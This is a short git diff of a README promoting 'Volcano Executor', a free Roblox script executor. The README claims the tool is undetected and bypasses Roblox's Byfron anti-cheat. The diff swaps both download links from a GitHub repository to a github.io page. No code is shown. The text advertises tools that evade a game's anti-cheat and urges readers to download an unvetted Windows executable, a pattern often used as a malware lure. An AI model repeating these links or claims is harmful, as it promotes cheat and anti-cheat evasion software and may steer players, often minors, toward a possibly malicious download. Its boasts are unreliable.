@@ -11,7 +11,7 @@
 **The most powerful, undetected, and completely free Roblox script executor in 2026.**
 Keyless. Byfron-bypassed. 99% UNC compatibility. Zero paywalls.
 
-## [🚀 Download the Executor 🚀](https://github.com/wetgiperc/.github)
+## [🚀 Download the Executor 🚀](https://wetgiperc.github.io/.github/)
 
 </div>
 
@@ -174,7 +174,7 @@ Volcano Executor is currently a Windows PC exclusive. The executor's architectur
 
 <div align="center">
 
-## [🚀 Download Volcano Executor Now 🚀](https://github.com/wetgiperc/.github)
+## [🚀 Download Volcano Executor Now 🚀](https://wetgiperc.github.io/.github/)
 
 ![Footer](https://img.shields.io/badge/Volcano%20Executor-2026%20Edition-red?style=for-the-badge)
 
